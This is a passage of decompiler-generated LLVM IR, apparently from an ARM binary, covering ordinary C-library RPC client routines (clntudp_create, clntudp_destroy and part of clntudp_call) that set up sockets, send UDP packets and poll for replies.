  store i32 %v2_321e8, i32* %r0.global-to-local, align 4
  %v4_321ec = call i32 @ioctl(i32 %v2_321e8, i32 21537, i32 %v2_321e4)
  store i32 %v4_321ec, i32* %r0.global-to-local, align 4
  %v0_321f0 = load i32, i32* @fp, align 4
  %v1_321f0 = inttoptr i32 %v0_321f0 to i32*
  %v2_321f0 = load i32, i32* %v1_321f0, align 4
  store i32 %v2_321f0, i32* %r0.global-to-local, align 4
  %v0_321f8 = load i32, i32* @sl, align 4
  %v2_32200 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_32200, i32* %r3.global-to-local, align 4
  %v0_32208 = load i32, i32* @r4, align 4
  store i32 %v0_32208, i32* %stack_var_-56, align 4
  %v5_3220c = call i32 @__GI_setsockopt(i32 %v2_321f0, i32 %v0_321f8, i32 11, i32 %v2_32200, i32 4)
  store i32 %v5_3220c, i32* %r0.global-to-local, align 4
  %v0_32210 = load i32, i32* @r4, align 4
  %v1_32210 = load i32, i32* @r5, align 4
  %v2_32210 = add i32 %v1_32210, 4
  %v3_32210 = inttoptr i32 %v2_32210 to i32*
  store i32 %v0_32210, i32* %v3_32210, align 4
  br label %dec_label_pc_32214

dec_label_pc_32214:                               ; preds = %bb34, %dec_label_pc_321d8
  %v0_32214 = load i32, i32* @fp, align 4
  %v1_32214 = inttoptr i32 %v0_32214 to i32*
  %v2_32214 = load i32, i32* %v1_32214, align 4
  store i32 %v2_32214, i32* %r3.global-to-local, align 4
  %v1_32218 = load i32, i32* @r5, align 4
  %v2_32218 = inttoptr i32 %v1_32218 to i32*
  store i32 %v2_32214, i32* %v2_32218, align 4
  %v0_3221c = call i32 @authnone_create()
  store i32 %v0_3221c, i32* %r0.global-to-local, align 4
  %v1_32220 = load i32, i32* @r6, align 4
  %v2_32220 = inttoptr i32 %v1_32220 to i32*
  store i32 %v0_3221c, i32* %v2_32220, align 4
  %v0_32248.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_32248

dec_label_pc_32228:                               ; preds = %dec_label_pc_320d8, %dec_label_pc_320a8, %dec_label_pc_321b8, %dec_label_pc_32060
  %v0_32228 = load i32, i32* @r5, align 4
  %v2_32228 = icmp eq i32 %v0_32228, 0
  br i1 %v2_32228, label %bb36, label %bb35

bb35:                                             ; preds = %dec_label_pc_32228
  store i32 %v0_32228, i32* %r0.global-to-local, align 4
  br label %bb36

bb36:                                             ; preds = %dec_label_pc_32228, %bb35
  store i32 205364, i32* @lr, align 4
  %v1_32230 = xor i1 %v2_32228, true
  call void @__pseudo_cond_branch(i1 %v1_32230, i32 ptrtoint (i32* @global_var_29ae4.1572 to i32))
  %v0_32234 = load i32, i32* @r6, align 4
  %v2_32234 = icmp eq i32 %v0_32234, 0
  br i1 %v2_32234, label %dec_label_pc_32248, label %dec_label_pc_3223c

dec_label_pc_3223c:                               ; preds = %bb36
  store i32 %v0_32234, i32* @r0, align 4
  %v0_32240 = call i32 @free()
  store i32 %v0_32240, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_32248

dec_label_pc_32248:                               ; preds = %bb36, %dec_label_pc_32214, %dec_label_pc_3223c
  %v0_32248 = phi i32 [ 0, %bb36 ], [ %v0_32248.pre, %dec_label_pc_32214 ], [ 0, %dec_label_pc_3223c ]
  store i32 %v0_32248, i32* %r0.global-to-local, align 4
  store i32 %v3_31fe8, i32* @r4, align 4
  store i32 %v6_31fe8, i32* @r5, align 4
  store i32 %v9_31fe8, i32* @r6, align 4
  store i32 %v12_31fe8, i32* @r7, align 4
  store i32 %v15_31fe8, i32* @r8, align 4
  store i32 %v18_31fe8, i32* @sb, align 4
  store i32 %v21_31fe8, i32* @sl, align 4
  store i32 %v24_31fe8, i32* @fp, align 4
  store i32 %v27_31fe8, i32* @lr, align 4
  ret i32 %v0_32248

; uselistorder directives
  uselistorder i32 %v0_32248, { 1, 0 }
  uselistorder i32 %v0_32194, { 1, 0, 2 }
  uselistorder i32 %v1_32140, { 1, 0, 2 }
  uselistorder i32 %v0_32138, { 2, 1, 0 }
  uselistorder i32 %v4_320b8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_3209c, { 1, 0, 2 }
  uselistorder i32 %v1_3203c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_31ff4, { 2, 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder i32* %stack_var_-52, { 1, 0 }
  uselistorder i32 %tmp26, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3, 5, 4, 7, 6, 8, 9, 10, 14, 11, 12, 13, 15, 17, 16, 19, 18, 21, 20, 24, 22, 23, 25, 27, 26, 28 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 0, 11, 10, 9, 1, 8, 7, 6, 5, 4, 3, 2 }
  uselistorder i32 (i32, i32, i32)* @socket, { 2, 1, 35, 5, 15, 34, 33, 32, 37, 36, 31, 7, 6, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 14, 13, 12, 11, 10, 9, 8, 0, 4, 3 }
  uselistorder i32 84, { 15, 1, 2, 0, 3, 12, 13, 4, 8, 9, 10, 11, 14, 5, 6, 7 }
  uselistorder i32 17, { 4, 18, 1, 5, 19, 6, 13, 7, 14, 8, 15, 9, 16, 3, 17, 20, 10, 11, 12, 2, 0 }
  uselistorder i32 100, { 22, 15, 6, 5, 14, 7, 0, 8, 1, 2, 3, 9, 16, 10, 17, 11, 18, 4, 19, 12, 20, 21, 13 }
  uselistorder label %dec_label_pc_32248, { 2, 0, 1 }
  uselistorder label %bb36, { 1, 0 }
  uselistorder label %dec_label_pc_32228, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_32214, { 1, 0 }
  uselistorder label %dec_label_pc_320d8, { 1, 0 }
  uselistorder label %dec_label_pc_32060, { 1, 0 }
}

define i32 @__GI_clntudp_create(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r3, align 4
  store i32 %arg1, i32* @r0, align 4
  %v0_32274 = load i32, i32* @lr, align 4
  store i32 %arg3, i32* @lr, align 4
  %v0_3229c = call i32 @__GI_clntudp_bufcreate()
  store i32 %v0_32274, i32* @lr, align 4
  ret i32 %v0_3229c
}

define i32 @clntudp_destroy(i32 %arg1) local_unnamed_addr {
entry:
  %v1_322b8 = add i32 %arg1, 8
  %v2_322b8 = inttoptr i32 %v1_322b8 to i32*
  %v3_322b8 = load i32, i32* %v2_322b8, align 4
  store i32 %v3_322b8, i32* @r4, align 4
  %v1_322bc = add i32 %v3_322b8, 4
  %v2_322bc = inttoptr i32 %v1_322bc to i32*
  %v3_322bc = load i32, i32* %v2_322bc, align 4
  %v2_322c0 = icmp eq i32 %v3_322bc, 0
  store i32 %arg1, i32* @r5, align 4
  br i1 %v2_322c0, label %bb5, label %bb

bb:                                               ; preds = %entry
  br label %bb5

bb5:                                              ; preds = %entry, %bb
  store i32 205524, i32* @lr, align 4
  %v1_322d0 = xor i1 %v2_322c0, true
  call void @__pseudo_cond_branch(i1 %v1_322d0, i32 ptrtoint (i32* @global_var_235b8.2048 to i32))
  %v0_322d4 = load i32, i32* @r4, align 4
  %v1_322d4 = add i32 %v0_322d4, 60
  %v2_322d4 = inttoptr i32 %v1_322d4 to i32*
  %v3_322d4 = load i32, i32* %v2_322d4, align 4
  %v1_322d8 = add i32 %v3_322d4, 28
  %v2_322d8 = inttoptr i32 %v1_322d8 to i32*
  %v3_322d8 = load i32, i32* %v2_322d8, align 4
  %v2_322dc = icmp eq i32 %v3_322d8, 0
  br i1 %v2_322dc, label %.thread, label %bb6

bb6:                                              ; preds = %bb5
  store i32 205548, i32* @lr, align 4
  br label %.thread

.thread:                                          ; preds = %bb5, %bb6
  %v2_322e8 = xor i1 %v2_322dc, true
  call void @__pseudo_cond_branch(i1 %v2_322e8, i32 %v3_322d8)
  %v0_322ec = load i32, i32* @r4, align 4
  store i32 %v0_322ec, i32* @r0, align 4
  %v0_322f0 = call i32 @free()
  %v0_322f4 = load i32, i32* @r5, align 4
  store i32 %v0_322f4, i32* @r0, align 4
  %v0_322f8 = call i32 @free()
  ret i32 %v0_322f8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %bb5, { 1, 0 }
}

define i32 @clntudp_call(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %tmp60 = call i32 @__decompiler_undefined_function_0()
  %tmp68 = call i16 @__decompiler_undefined_function_2()
  %tmp80 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-212 = alloca i32, align 4
  %stack_var_-132 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %tmp110 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-148 = alloca i16, align 2
  %stack_var_-164 = alloca i32, align 4
  %stack_var_-76 = alloca i8*, align 4
  %stack_var_-9012 = alloca i32, align 4
  %stack_var_-92 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-200 = alloca i32, align 4
  %stack_var_-9020 = alloca i32, align 4
  %stack_var_-108 = alloca i16, align 2
  %stack_var_-9008 = alloca i32, align 4
  %stack_var_-8964 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-8196 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %v9_3230c = load i32, i32* @r6, align 4
  %v15_3230c = load i32, i32* @r8, align 4
  %v2_3231c = ptrtoint i32* %stack_var_-8196 to i32
  %v2_32328 = ptrtoint i32* %stack_var_-48 to i32
  %v3_3232c = add i32 %v2_32328, -8972
  %v4_3232c = inttoptr i32 %v3_3232c to i32*
  store i32 %arg2, i32* %v4_3232c, align 4
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v1_32338 = add i32 %tmp, 8
  %v2_32338 = inttoptr i32 %v1_32338 to i32*
  %v3_32338 = load i32, i32* %v2_32338, align 4
  store i32 %v3_32338, i32* @r5, align 4
  %v1_32340 = add i32 %v3_32338, 32
  %v2_32340 = inttoptr i32 %v1_32340 to i32*
  %v3_32340 = load i32, i32* %v2_32340, align 4
  store i32 1000, i32* %r1.global-to-local, align 4
  %v2_32350 = sdiv i32 %v3_32340, 1000
  store i32 %v2_32350, i32* %r0.global-to-local, align 4
  store i32 %v2_3231c, i32* %r3.global-to-local, align 4
  %v1_3235c = add i32 %v3_32338, 40
  %v2_3235c = inttoptr i32 %v1_3235c to i32*
  %v3_3235c = load i32, i32* %v2_3235c, align 4
  store i32 %v3_3235c, i32* %r1.global-to-local, align 4
  %v1_32364 = add i32 %v3_32338, 28
  %v2_32364 = inttoptr i32 %v1_32364 to i32*
  %v3_32364 = load i32, i32* %v2_32364, align 4
  %v3_3236c = mul i32 %v3_32364, 1000
  %v4_3236c = add i32 %v3_3236c, %v2_32350
  store i32 75280, i32* %r0.global-to-local, align 4
  %v7_32384 = icmp eq i32 %v3_3235c, -1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  store i32 %arg8, i32* %r3.global-to-local, align 4
  br i1 %v7_32384, label %.thread, label %.thread18

.thread:                                          ; preds = %entry
  store i32 %v2_3231c, i32* %r1.global-to-local, align 4
  %v3_323a0 = add i32 %v2_3231c, -836
  %v4_323a0 = inttoptr i32 %v3_323a0 to i32*
  store i32 %arg8, i32* %v4_323a0, align 4
  %v1_323a8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v1_323a8, i32* %r3.global-to-local, align 4
  %v2_323ac = ptrtoint i32* %stack_var_-8964 to i32
  store i32 %v2_323ac, i32* %r1.global-to-local, align 4
  %v1_323b0 = load i32, i32* %r2.global-to-local, align 4
  %v3_323b0 = add i32 %v1_323a8, -832
  %v4_323b0 = inttoptr i32 %v3_323b0 to i32*
  store i32 %v1_323b0, i32* %v4_323b0, align 4
  br label %bb

.thread18:                                        ; preds = %entry
  %v2_32394 = add i32 %v3_32338, 36
  %v3_32394 = inttoptr i32 %v2_32394 to i32*
  %v4_32394 = load i32, i32* %v3_32394, align 4
  store i32 %v4_32394, i32* %r0.global-to-local, align 4
  store i32 %v2_3231c, i32* %r2.global-to-local, align 4
  %v3_323a4 = add i32 %v2_3231c, -836
  %v4_323a4 = inttoptr i32 %v3_323a4 to i32*
  store i32 %v3_3235c, i32* %v4_323a4, align 4
  %v2_323ac12 = ptrtoint i32* %stack_var_-8964 to i32
  store i32 %v2_323ac12, i32* %r1.global-to-local, align 4
  %v1_323b4 = load i32, i32* %r0.global-to-local, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread18
  %stack_var_-9028.0 = phi i32 [ %tmp110, %.thread ], [ %v1_323b4, %.thread18 ]
  %v2_323bc = ptrtoint i32* %stack_var_-9008 to i32
  %v2_323d0 = ptrtoint i16* %stack_var_-108 to i32
  %v2_323e8 = ptrtoint i32* %stack_var_-9020 to i32
  %v2_3240c = ptrtoint i32* %stack_var_-200 to i32
  %v2_32420 = ptrtoint i32* %stack_var_-60 to i32
  store i32 %v2_32420, i32* %r2.global-to-local, align 4
  store i32 %v2_323d0, i32* %r0.global-to-local, align 4
  %v2_32430 = ptrtoint i32* %stack_var_-92 to i32
  store i32 %v2_3231c, i32* %r3.global-to-local, align 4
  %v1_3243c = add i32 %v2_323d0, 4
  store i32 %v1_3243c, i32* %r1.global-to-local, align 4
  %v2_32444 = ptrtoint i32* %stack_var_-9012 to i32
  %v2_32450 = icmp eq i32 %arg3, 0
  %v3_325a4 = add i32 %v2_3240c, 4
  %v4_325a4 = inttoptr i32 %v3_325a4 to i32*
  %v6_325a4 = add i32 %v2_3240c, 8
  %v7_325a4 = inttoptr i32 %v6_325a4 to i32*
  %v4_32744 = zext i16 %tmp68 to i32
  %v1_32748 = and i32 %v4_32744, 8
  %v2_32748 = icmp eq i32 %v1_32748, 0
  %v2_3289c = ptrtoint i32* %stack_var_-52 to i32
  %v3_32764 = add i32 %v2_32328, -8964
  %v4_32764 = inttoptr i32 %v3_32764 to i32*
  %v2_3260c = ptrtoint i8** %stack_var_-76 to i32
  %v2_32630 = ptrtoint i32* %stack_var_-164 to i32
  %v13_32644 = ptrtoint i16* %stack_var_-148 to i32
  %v2_32930 = ptrtoint i32* %stack_var_-132 to i32
  %v2_32944 = ptrtoint i32* %stack_var_-212 to i32
  %v2_32580 = icmp eq i32 %tmp80, 0
  %v2_32570 = icmp eq i32 %stack_var_-9028.0, 0
  br label %dec_label_pc_32448

dec_label_pc_32448:                               ; preds = %dec_label_pc_32a10, %bb
  %stack_var_-9024.0 = phi i32 [ 0, %bb ], [ %stack_var_-9024.2, %dec_label_pc_32a10 ]
  %stack_var_-9036.0 = phi i32 [ 0, %bb ], [ %stack_var_-9036.2, %dec_label_pc_32a10 ]
  %stack_var_-9040.0 = phi i32 [ 2, %bb ], [ %v1_32a18, %dec_label_pc_32a10 ]
  %stack_var_-9048.0 = phi i32 [ 0, %bb ], [ %stack_var_-9048.2, %dec_label_pc_32a10 ]
  store i32 %arg3, i32* %r1.global-to-local, align 4
  %v0_32454 = load i32, i32* @r5, align 4
  %v1_32454 = add i32 %v0_32454, 56
  store i32 %v1_32454, i32* %sb.global-to-local, align 4
  br i1 %v2_32450, label %dec_label_pc_32588, label %dec_label_pc_3245c

dec_label_pc_3245c:                               ; preds = %dec_label_pc_32448
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_32460 = inttoptr i32 %v1_32454 to i32*
  store i32 0, i32* %v3_32460, align 4
  %v0_32464 = load i32, i32* @r5, align 4
  %v1_32464 = add i32 %v0_32464, 80
  %v2_32464 = inttoptr i32 %v1_32464 to i32*
  %v3_32464 = load i32, i32* %v2_32464, align 4
  store i32 %v3_32464, i32* %r1.global-to-local, align 4
  %v1_32468 = add i32 %v0_32464, 60
  %v2_32468 = inttoptr i32 %v1_32468 to i32*
  %v3_32468 = load i32, i32* %v2_32468, align 4
  store i32 %v3_32468, i32* %r3.global-to-local, align 4
  %v0_3246c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_3246c, i32* %r0.global-to-local, align 4
  %v1_32470 = add i32 %v3_32468, 20
  %v2_32470 = inttoptr i32 %v1_32470 to i32*
  %v3_32470 = load i32, i32* %v2_32470, align 4
  call void @__pseudo_branch(i32 %v3_32470)
  %v0_3247c = load i32, i32* @r5, align 4
  %v1_3247c = add i32 %v0_3247c, 88
  %v2_3247c = inttoptr i32 %v1_3247c to i32*
  %v3_3247c = load i32, i32* %v2_3247c, align 4
  store i32 %v3_3247c, i32* %r2.global-to-local, align 4
  %v1_32480 = inttoptr i32 %v3_3247c to i32*
  %v2_32480 = load i32, i32* %v1_32480, align 4
  %v1_32484 = add i32 %v2_32480, 1
  store i32 %v1_32484, i32* %r3.global-to-local, align 4
  store i32 %v1_32484, i32* %v1_32480, align 4
  store i32 %v2_3231c, i32* %r2.global-to-local, align 4
  %v0_32490 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_32490, i32* %r0.global-to-local, align 4
  %v0_32494 = load i32, i32* @r5, align 4
  %v1_32494 = add i32 %v0_32494, 60
  %v2_32494 = inttoptr i32 %v1_32494 to i32*
  %v3_32494 = load i32, i32* %v2_32494, align 4
  store i32 %v3_32494, i32* %r3.global-to-local, align 4
  store i32 %v2_323e8, i32* %r1.global-to-local, align 4
  %v1_3249c = add i32 %v3_32494, 4
  %v2_3249c = inttoptr i32 %v1_3249c to i32*
  %v3_3249c = load i32, i32* %v2_3249c, align 4
  call void @__pseudo_branch(i32 %v3_3249c)
  %v0_324a8 = load i32, i32* %r0.global-to-local, align 4
  %v2_324a8 = icmp eq i32 %v0_324a8, 0
  br i1 %v2_324a8, label %dec_label_pc_3272c, label %dec_label_pc_324b0

dec_label_pc_324b0:                               ; preds = %dec_label_pc_3245c
  %v2_324b8 = load i32, i32* %arg1, align 4
  store i32 %v2_324b8, i32* %r3.global-to-local, align 4
  %v0_324bc = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_324bc, i32* %r1.global-to-local, align 4
  store i32 %v2_324b8, i32* %r0.global-to-local, align 4
  %v1_324c4 = add i32 %v2_324b8, 32
  %v2_324c4 = inttoptr i32 %v1_324c4 to i32*
  %v3_324c4 = load i32, i32* %v2_324c4, align 4
  store i32 %v3_324c4, i32* %r3.global-to-local, align 4
  %v1_324c8 = add i32 %v3_324c4, 4
  %v2_324c8 = inttoptr i32 %v1_324c8 to i32*
  %v3_324c8 = load i32, i32* %v2_324c8, align 4
  call void @__pseudo_branch(i32 %v3_324c8)
  %v0_324d4 = load i32, i32* %r0.global-to-local, align 4
  %v2_324d4 = icmp eq i32 %v0_324d4, 0
  br i1 %v2_324d4, label %dec_label_pc_3272c, label %dec_label_pc_324dc

dec_label_pc_324dc:                               ; preds = %dec_label_pc_324b0
  store i32 %v2_3231c, i32* %r2.global-to-local, align 4
  %v0_324e0 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_324e0, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* %r1.global-to-local, align 4
  store i32 %arg3, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 %arg3)
  %v0_324f4 = load i32, i32* %r0.global-to-local, align 4
  %v2_324f4 = icmp eq i32 %v0_324f4, 0
  br i1 %v2_324f4, label %dec_label_pc_3272c, label %dec_label_pc_32504

dec_label_pc_32504:                               ; preds = %dec_label_pc_324dc
  %v0_32504 = load i32, i32* @r5, align 4
  %v1_32504 = add i32 %v0_32504, 60
  %v2_32504 = inttoptr i32 %v1_32504 to i32*
  %v3_32504 = load i32, i32* %v2_32504, align 4
  store i32 %v3_32504, i32* %r3.global-to-local, align 4
  %v0_32508 = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_32508, i32* %r0.global-to-local, align 4
  %v1_3250c = add i32 %v3_32504, 16
  %v2_3250c = inttoptr i32 %v1_3250c to i32*
  %v3_3250c = load i32, i32* %v2_3250c, align 4
  store i32 206104, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_3250c)
  %v0_3251c = load i32, i32* %r0.global-to-local, align 4
  %v0_32520.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_32520

dec_label_pc_32520:                               ; preds = %dec_label_pc_32718, %dec_label_pc_32700, %dec_label_pc_32504
  %v0_32534 = phi i32 [ %v0_32698, %dec_label_pc_32700 ], [ %v0_32698, %dec_label_pc_32718 ], [ %v0_32520.pre, %dec_label_pc_32504 ]
  %stack_var_-9024.1 = phi i32 [ %stack_var_-9024.3.lcssa, %dec_label_pc_32700 ], [ %stack_var_-9028.0, %dec_label_pc_32718 ], [ %stack_var_-9024.0, %dec_label_pc_32504 ]
  %stack_var_-9036.1 = phi i32 [ %v0_32720, %dec_label_pc_32700 ], [ %v0_32720, %dec_label_pc_32718 ], [ %stack_var_-9036.0, %dec_label_pc_32504 ]
  %stack_var_-9048.1 = phi i32 [ %stack_var_-9048.2, %dec_label_pc_32700 ], [ %stack_var_-9048.2, %dec_label_pc_32718 ], [ %v0_3251c, %dec_label_pc_32504 ]
  %v1_32520 = add i32 %v0_32534, 8
  store i32 %v1_32520, i32* %r3.global-to-local, align 4
  %v1_32524 = inttoptr i32 %v0_32534 to i32*
  %v2_32524 = load i32, i32* %v1_32524, align 4
  store i32 %v2_32524, i32* %r0.global-to-local, align 4
  %v1_32528 = add i32 %v0_32534, 88
  %v2_32528 = inttoptr i32 %v1_32528 to i32*
  %v3_32528 = load i32, i32* %v2_32528, align 4
  store i32 %v3_32528, i32* %r1.global-to-local, align 4
  store i32 %v2_3231c, i32* %r3.global-to-local, align 4
  %v1_32534 = add i32 %v0_32534, 24
  %v2_32534 = inttoptr i32 %v1_32534 to i32*
  %v3_32534 = load i32, i32* %v2_32534, align 4
  store i32 %stack_var_-9048.1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v6_32544 = call i32 @__libc_sendto(i32 %v2_32524, i32 %v3_32528, i32 %stack_var_-9048.1, i32 0, i32 %v1_32520, i32 %v3_32534)
  store i32 %v6_32544, i32* %r0.global-to-local, align 4
  %v9_32550 = icmp eq i32 %v6_32544, %stack_var_-9048.1
  br i1 %v9_32550, label %dec_label_pc_32568, label %dec_label_pc_32558

dec_label_pc_32558:                               ; preds = %dec_label_pc_32520
  %v0_32558 = call i32 @__GI___errno_location()
  store i32 %v0_32558, i32* %r0.global-to-local, align 4
  %v1_3255c = inttoptr i32 %v0_32558 to i32*
  %v2_3255c = load i32, i32* %v1_3255c, align 4
  store i32 %v2_3255c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_328f4

dec_label_pc_32568:                               ; preds = %dec_label_pc_32520
  store i32 %stack_var_-9028.0, i32* %r0.global-to-local, align 4
  br i1 %v2_32570, label %dec_label_pc_32578, label %dec_label_pc_32588

dec_label_pc_32578:                               ; preds = %dec_label_pc_32568
  store i32 %tmp80, i32* %r1.global-to-local, align 4
  br i1 %v2_32580, label %dec_label_pc_3272c, label %dec_label_pc_32588

dec_label_pc_32588:                               ; preds = %dec_label_pc_32568, %dec_label_pc_32578, %dec_label_pc_32448
  %stack_var_-9024.2 = phi i32 [ %stack_var_-9024.0, %dec_label_pc_32448 ], [ %stack_var_-9024.1, %dec_label_pc_32578 ], [ %stack_var_-9024.1, %dec_label_pc_32568 ]
  %stack_var_-9036.2 = phi i32 [ %stack_var_-9036.0, %dec_label_pc_32448 ], [ %stack_var_-9036.1, %dec_label_pc_32578 ], [ %stack_var_-9036.1, %dec_label_pc_32568 ]
  %stack_var_-9048.2 = phi i32 [ %stack_var_-9048.0, %dec_label_pc_32448 ], [ %stack_var_-9048.1, %dec_label_pc_32578 ], [ %stack_var_-9048.1, %dec_label_pc_32568 ]
  store i32 %v2_3231c, i32* %r2.global-to-local, align 4
  store i32 240, i32* %r0.global-to-local, align 4
  %v4_32594 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 240) to i32*), align 4
  store i32 %v4_32594, i32* %r3.global-to-local, align 4
  %v1_32598 = inttoptr i32 %v4_32594 to i32*
  %v2_32598 = load i32, i32* %v1_32598, align 4
  store i32 %v2_32598, i32* %r0.global-to-local, align 4
  %v3_32598 = add i32 %v4_32594, 4
  %v4_32598 = inttoptr i32 %v3_32598 to i32*
  %v5_32598 = load i32, i32* %v4_32598, align 4
  store i32 %v5_32598, i32* %r1.global-to-local, align 4
  %v6_32598 = add i32 %v4_32594, 8
  %v7_32598 = inttoptr i32 %v6_32598 to i32*
  %v8_32598 = load i32, i32* %v7_32598, align 4
  store i32 %v8_32598, i32* %r2.global-to-local, align 4
  store i32 %v2_3240c, i32* %r3.global-to-local, align 4
  store i32 %v2_32598, i32* %stack_var_-200, align 4
  store i32 %v5_32598, i32* %v4_325a4, align 4
  %v8_325a4 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v8_325a4, i32* %v7_325a4, align 4
  %v3_325a8 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_325a8, i32* %r0.global-to-local, align 4
  store i32 %v2_3231c, i32* %r1.global-to-local, align 4
  %v0_325b8 = load i32, i32* @r5, align 4
  %v1_325b8 = inttoptr i32 %v0_325b8 to i32*
  %v2_325b8 = load i32, i32* %v1_325b8, align 4
  store i32 %stack_var_-9048.2, i32* %r1.global-to-local, align 4
  store i32 %v2_325b8, i32* %stack_var_-60, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  %v1_325cc = add i32 %stack_var_-9048.2, 270
  store i32 %v1_325cc, i32* %r3.global-to-local, align 4
  %v1_325d4 = and i32 %v1_325cc, -8
  store i32 %v1_325d4, i32* @r8, align 4
  br label %dec_label_pc_325d8

dec_label_pc_325d8:                               ; preds = %dec_label_pc_328e0, %dec_label_pc_3291c, %dec_label_pc_32904, %dec_label_pc_328ec, %dec_label_pc_32588
  store i32 %v2_3231c, i32* %r3.global-to-local, align 4
  store i32 %v2_32420, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v4_3236c, i32* %r2.global-to-local, align 4
  %v3_325e8 = call i32 @__GI_poll(i32 %v2_32420, i32 1, i32 %v4_3236c)
  store i32 %v3_325e8, i32* %r0.global-to-local, align 4
  %v7_325ec = icmp eq i32 %v3_325e8, -1
  br i1 %v7_325ec, label %dec_label_pc_328ec, label %dec_label_pc_325f4

dec_label_pc_325f4:                               ; preds = %dec_label_pc_325d8
  %v2_325f4 = icmp eq i32 %v3_325e8, 0
  br i1 %v2_325f4, label %dec_label_pc_325fc, label %dec_label_pc_32744

dec_label_pc_325fc:                               ; preds = %dec_label_pc_325f4
  %v0_325fc = load i32, i32* @r5, align 4
  %v1_325fc = inttoptr i32 %v0_325fc to i32*
  %v2_325fc = load i32, i32* %v1_325fc, align 4
  store i32 %v2_325fc, i32* %r8.global-to-local, align 4
  store i32 8800, i32* @r3, align 4
  store i32 35090, i32* %r1.global-to-local, align 4
  store i32 %v2_325fc, i32* %r0.global-to-local, align 4
  store i32 %v2_3260c, i32* %r2.global-to-local, align 4
  store i8* inttoptr (i32 8800 to i8*), i8** %stack_var_-76, align 4
  %v3_32618 = call i32 @ioctl(i32 %v2_325fc, i32 35090, i32 %v2_3260c)
  store i32 %v3_32618, i32* %r0.global-to-local, align 4
  %v2_3261c = icmp eq i32 %v3_32618, 0
  br i1 %v2_3261c, label %dec_label_pc_32624, label %dec_label_pc_32a38

dec_label_pc_32624:                               ; preds = %dec_label_pc_325fc
  %v2_32628 = load i8*, i8** %stack_var_-76, align 4
  %v3_32628 = ptrtoint i8* %v2_32628 to i32
  store i32 %v3_32628, i32* %r3.global-to-local, align 4
  store i32 %v2_32444, i32* @r4, align 4
  %v3_3262c = udiv i32 %v3_32628, 32
  store i32 %v2_32630, i32* @r7, align 4
  %tmp148 = icmp ult i8* %v2_32628, inttoptr (i32 32 to i8*)
  %v1_3268828 = add nsw i32 %v3_3262c, -1
  store i32 %v1_3268828, i32* %r6.global-to-local, align 4
  br i1 %tmp148, label %dec_label_pc_32a38, label %dec_label_pc_32638

dec_label_pc_32638:                               ; preds = %dec_label_pc_32624, %dec_label_pc_32680
  %v0_32638 = phi i32 [ %v1_32680, %dec_label_pc_32680 ], [ %v2_32444, %dec_label_pc_32624 ]
  %v1_3263c = inttoptr i32 %v0_32638 to i32*
  %v2_3263c = load i32, i32* %v1_3263c, align 4
  store i32 %v2_3263c, i32* %r0.global-to-local, align 4
  %v3_3263c = add i32 %v0_32638, 4
  %v4_3263c = inttoptr i32 %v3_3263c to i32*
  %v5_3263c = load i32, i32* %v4_3263c, align 4
  store i32 %v5_3263c, i32* %r1.global-to-local, align 4
  %v6_3263c = add i32 %v0_32638, 8
  %v7_3263c = inttoptr i32 %v6_3263c to i32*
  %v8_3263c = load i32, i32* %v7_3263c, align 4
  store i32 %v8_3263c, i32* %r2.global-to-local, align 4
  %v9_3263c = add i32 %v0_32638, 12
  %v10_3263c = inttoptr i32 %v9_3263c to i32*
  %v11_3263c = load i32, i32* %v10_3263c, align 4
  store i32 %v11_3263c, i32* %r3.global-to-local, align 4
